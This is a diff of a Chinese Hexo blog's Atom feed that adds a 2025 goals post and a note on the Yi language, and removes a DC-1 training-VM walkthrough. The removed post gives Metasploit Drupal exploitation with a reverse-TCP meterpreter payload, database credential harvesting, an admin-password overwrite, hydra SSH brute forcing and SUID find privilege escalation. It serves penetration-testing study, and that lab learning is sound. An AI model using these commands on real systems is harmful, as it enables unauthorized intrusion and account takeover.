@@ -6,7 +6,7 @@
   <link href="https://fogpost.top/atom.xml" rel="self"/>
   
   <link href="https://fogpost.top/"/>
-  <updated>2025-01-11T02:51:53.888Z</updated>
+  <updated>2025-02-24T09:30:54.309Z</updated>
   <id>https://fogpost.top/</id>
   
   <author>
@@ -17,15 +17,50 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>2025</title>
+    <link href="https://fogpost.top/2025/02/24/2025/"/>
+    <id>https://fogpost.top/2025/02/24/2025/</id>
+    <published>2025-02-24T09:09:48.000Z</published>
+    <updated>2025-02-24T09:30:54.309Z</updated>
+    
+    <content type="html"><![CDATA[<p>一晃眼就已经是2025年了，去年的烦恼还没有散去，今年的烦恼就已经找上门来了，这一篇算是鼓励也算是警醒吧，说是有多忙，其实倒也没多少事，完成以下几件事是目前的需要</p><ul><li><p>完成程序设计课程</p></li><li><p>继续学习web的相关知识为之后的hvv做好准备</p></li><li><p>准备好考研的相关事宜<br>这个学期没有什么课程，技术方向的事情便可以有时间提升，剩下的想到再补吧<br>ps： 锻炼也要跟上，老是想玩游戏，总是忍不住去玩而不是精进自己也算是要完成的事吧</p></li><li><p>个人能力<br><img src="https://gitee.com/fogpost/photo/raw/master/202502241730506.png" srcset="/img/loading.gif" lazyload></p></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;一晃眼就已经是2025年了，去年的烦恼还没有散去，今年的烦恼就已经找上门来了，这一篇算是鼓励也算是警醒吧，说是有多忙，其实倒也没多少事，完成以下几件事是目前的需要&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;完成程序设计课程&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;继续学习web的相关知识为</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>易语言初识</title>
     <link href="https://fogpost.top/2025/01/11/%E6%98%93%E8%AF%AD%E8%A8%80%E5%88%9D%E8%AF%86/"/>
     <id>https://fogpost.top/2025/01/11/%E6%98%93%E8%AF%AD%E8%A8%80%E5%88%9D%E8%AF%86/</id>
     <published>2025-01-11T02:51:53.000Z</published>
-    <updated>2025-01-11T02:51:53.888Z</updated>
+    <updated>2025-01-11T02:57:12.047Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="易语言"><a href="#易语言" class="headerlink" title="易语言"></a>易语言</h1><p>易语言作为以中文为代码的编写程序而出名，在许多的中文环境和论坛中有较高的应用，同时也是黑灰产中的部分，在学习逆向的同时，或多或少会接触一些易语言的知识，了解基本的编写结构以及语法是十分有必要的</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;易语言&quot;&gt;&lt;a href=&quot;#易语言&quot; class=&quot;headerlink&quot; title=&quot;易语言&quot;&gt;&lt;/a&gt;易语言&lt;/h1&gt;&lt;p&gt;易语言作为以中文为代码的编写程序而出名，在许多的中文环境和论坛中有较高的应用，同时也是黑灰产中的部分，在学习逆向的同时，或多或少会接</summary>
+      
     
     
     
+    <category term="programming" scheme="https://fogpost.top/categories/programming/"/>
     
+    
+    <category term="tool" scheme="https://fogpost.top/tags/tool/"/>
     
   </entry>
   
@@ -446,30 +481,6 @@
     
     
     
-    
-  </entry>
-  
-  <entry>
-    <title>DC-提权靶机</title>
-    <link href="https://fogpost.top/2024/11/19/DC-%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/"/>
-    <id>https://fogpost.top/2024/11/19/DC-%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/</id>
-    <published>2024-11-19T03:58:32.000Z</published>
-    <updated>2025-01-11T02:40:03.678Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>学习web怎么可以少了对靶机的攻击呢，渗透方向的学习必须要有靶机攻击的基础，前几天看到一篇文章发现DC系列正好可以来训练自己的水平和对工具的理解和使用</p><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h1><p>攻击机 kali2024.3<br>靶机 DC系列</p><h1 id="具体攻击"><a href="#具体攻击" class="headerlink" title="具体攻击"></a>具体攻击</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="目标机ip"><a href="#目标机ip" class="headerlink" title="目标机ip"></a>目标机ip</h4><p>在利用ifconfig了解知道自己的ip为192.168.56.135后利用nmap扫描同网段存活主机</p><blockquote><p>nmap -sP 192.168.56.135&#x2F;24<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191207141.png" srcset="/img/loading.gif" lazyload></p></blockquote><p>也可以利用arp-scan:</p><blockquote><p>arp-scan -l<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191209537.png" srcset="/img/loading.gif" lazyload></p></blockquote><p>获取到目标机ip为192.168.56.146</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><blockquote><p>nmap -A 192.168.56.146，详细扫描了对应的服务和版本<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191211378.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="目标访问"><a href="#目标访问" class="headerlink" title="目标访问"></a>目标访问</h4><p>我们发现存在80端口，利用web访问这个ip地址发现登录页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191214818.png" srcset="/img/loading.gif" lazyload><br>利用目录扫描工具，查看这个ip的目录文件</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>利用whatweb工具识别web服务器的指纹，在火狐上面有个好用的工具叫做wapper，也可以查看对应的cms服务，不过可能需要网速比较快才好</p><blockquote><p>whatweb -v 192.168.56.146,扫描到主要的系统版本，服务号和php版本<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191219907.png" srcset="/img/loading.gif" lazyload><br>wapper：<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191218063.png" srcset="/img/loading.gif" lazyload><br>发现CMS为Drupal，版本为7</p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>发现cms便可以尝试一下msf来使用现成的攻击模块了</p><h4 id="msfconsole获取session"><a href="#msfconsole获取session" class="headerlink" title="msfconsole获取session"></a>msfconsole获取session</h4><blockquote><p>msfconsole ，利用search命令搜索cms的漏洞<br>search Drupal<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191223407.png" srcset="/img/loading.gif" lazyload><br>发现序号为1的可以使用，我们完成设定好攻击模块的各个参数<br>use 1<br>show payloads<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191225109.png" srcset="/img/loading.gif" lazyload><br>我们发现，这些payload和前面出现的tcp端口可能有关系所以选择payload为php&#x2F;meterpreter&#x2F;reverse_tcp<br>set payload php&#x2F;meterpreter&#x2F;reverse_tcp<br>show options<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191227042.png" srcset="/img/loading.gif" lazyload><br>yes为必填大部分已经完成我们设计好攻击机ip，RHOSTS即可<br>set rhosts 192.168.56.146<br>exploit<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191229430.png" srcset="/img/loading.gif" lazyload><br>执行完成获取session  </p></blockquote><h4 id="获取shell登录sql"><a href="#获取shell登录sql" class="headerlink" title="获取shell登录sql"></a>获取shell登录sql</h4><blockquote><p>获取DC-1的信息和shell，运用python反弹，获取更好的交互<br>sysinfo shell<br>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191233860.png" srcset="/img/loading.gif" lazyload><br>ls+cat查看flag1<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191235094.png" srcset="/img/loading.gif" lazyload><br>利用find . -name “set*”查找set文件<br>发现settings文件,查看文件，发现flag和数据库信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191237652.png" srcset="/img/loading.gif" lazyload><br>使用数据库账户和密码来登录数据库<br>mysql -udbuser -pR0ck3t<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201642780.png" srcset="/img/loading.gif" lazyload><br>show databases;查看数据库<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201642468.png" srcset="/img/loading.gif" lazyload><br>use drupaldb; show tables;查看表,发现users表<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201644727.png" srcset="/img/loading.gif" lazyload><br>看表select * from users;看表结构desc users;<br>发现name和pass列<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201646673.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411201647915.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="覆盖admin密码登录"><a href="#覆盖admin密码登录" class="headerlink" title="覆盖admin密码登录"></a>覆盖admin密码登录</h4><blockquote><p>查看加密方式，搜索文件， find . -name “password*”<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201651432.png" srcset="/img/loading.gif" lazyload><br>查看password-hash.sh,发现为php加密文件，了解发现是使用 Drupal 的密码算法（基于 PBKDF2 和可配置的工作因子）生成一个加盐的安全哈希，没能力搞不懂我们用它来生成一个密码的哈希值，然后用这个哈希值去覆盖来登录<br>php  .&#x2F;scripts&#x2F;password-hash.sh  123456<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201656246.png" srcset="/img/loading.gif" lazyload><br>hash: $S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV&#x2F;F<br>覆盖admin的密码<br>mysql&gt;update users set pass&#x3D;”$S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV&#x2F;F” where name&#x3D;”admin”;<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201700729.png" srcset="/img/loading.gif" lazyload><br>成功登录，之后再dashborad中发现falg3<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201700614.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411201701862.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="获取flag4，爆破密码"><a href="#获取flag4，爆破密码" class="headerlink" title="获取flag4，爆破密码"></a>获取flag4，爆破密码</h4><blockquote><p>查看etc&#x2F;passwd,发现falg4的账户，查询falg4的home目录<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201702238.png" srcset="/img/loading.gif" lazyload><br>，这次发现需要root目录，而且让我们爆破了<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201703822.png" srcset="/img/loading.gif" lazyload><br>我们也有可能无法访问&#x2F;home&#x2F;flag4&#x2F;flag4.txt，可以用hydra工具来爆破flag4的密码,发现密码是，orange<br>hydra -l flag4 -P &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst 192.168.56.146 ssh<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201709083.png" srcset="/img/loading.gif" lazyload></p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>查找一个属于root的拥有s权限的文件</p><ul><li>SUID(Set User ID)，SUID 可以让调用者以文件拥有者的身份运行该文件，所以我们利用 SUID 提权的思路就是运行 root 用户所拥有的 SUID 的文件，那么我们运行该文件的时候就得获得 root 用户的身份了。</li></ul><p>常见的可用于 SUID 提权的文件有：</p><blockquote><p>find、bash、nmap、vim、more、less、nano、cp<br>&#x2F;&#x2F;当没有s权限时可以使用：chmod u+s 命令路径，增加权限</p></blockquote><p>查找哪些命令具备 SUID 标识</p><blockquote><p>find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p>发现find文件<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201714007.png" srcset="/img/loading.gif" lazyload><br>使用find文件来提权：<br>利用 find 命令随便查找一个正确的文件（夹）路径，后面加上 -exec shell 命令 ;<br>提权 &#x2F;bin&#x2F;bash 或者 &#x2F;bin&#x2F;sh<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201717565.png" srcset="/img/loading.gif" lazyload><br>最后完成flag获取<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201719543.png" srcset="/img/loading.gif" lazyload></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>DC-1虽然还是比较简单，但是流程也比较长在此做一个总结，DC-1靶机主要考察了信息收集、漏洞利用、权限提升、提权等基本知识。<br>数据库的操作，suid提权，hydra爆破ssh端口，这些都是我之前没有接触过的跟着流程走一边还是挺好的</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;学习web怎么可以少了对靶机的攻击呢，渗透方向的学习必须要有靶机攻击的基础，前几天看到一篇文章发现DC系列正好可以来训练自己的水平和对工具的</summary>
-      
-    
-    
-    
-    <category term="省投测试" scheme="https://fogpost.top/categories/%E7%9C%81%E6%8A%95%E6%B5%8B%E8%AF%95/"/>
-    
-    
-    <category term="web" scheme="https://fogpost.top/tags/web/"/>
     
   </entry>
   
